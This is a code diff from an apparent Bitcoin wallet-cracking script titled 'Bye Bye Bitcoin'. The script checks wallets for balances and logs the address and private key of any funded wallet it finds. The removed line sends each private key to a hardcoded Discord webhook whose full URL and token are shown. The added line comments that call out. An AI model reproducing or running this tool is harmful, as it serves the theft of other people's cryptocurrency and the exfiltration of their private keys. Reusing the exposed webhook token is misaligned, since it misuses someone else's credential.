@@ -25,7 +25,7 @@ while True:
         else:
             checked += 1
             if float(balance) > 0:              
-                requests.post("https://discord.com/api/webhooks/957625184813203516/LUshkl4hFTghCl_VnEC6rjuBNyq9ihIIbKJLsA2E6bgFjDcUT1qXd3R2ARqJrws59sLd", json={"content": f"{balance} BTC found\n\nAdress: {compaddy}\nPrivate Key: {privkey}"}) 
+                #requests.post("webhook URL", json={"content": f"{balance} BTC found\n\nAdress: {compaddy}\nPrivate Key: {privkey}"}) 
                 open('hits.txt', 'a+').write(f"{balance} BTC found in Adress: {compaddy} // Private Key: {privkey}")
             os.system("cls")
             os.system(f"title Bye Bye Bitcoin // Checked Wallets: {checked} // by clout")
